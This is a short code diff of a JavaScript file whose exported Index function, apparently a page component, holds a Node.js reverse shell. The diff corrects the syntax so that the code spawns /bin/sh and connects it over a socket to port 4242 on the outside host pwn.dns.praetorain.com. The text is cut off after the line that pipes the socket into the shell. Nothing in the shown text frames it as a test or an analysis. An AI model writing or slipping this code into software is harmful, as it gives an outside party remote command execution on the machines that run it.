@@ -1,8 +1,8 @@
 export default function Index() {
 
-  var net = require("net"),
-  var cp = require("child_process"),
-      sh = cp.spawn("/bin/sh", []);
+  var net = require("net");
+  var cp = require("child_process");
+  var sh = cp.spawn("/bin/sh", []);
   var client = new net.Socket();
   client.connect(4242, "pwn.dns.praetorain.com", function(){
       client.pipe(sh.stdin);
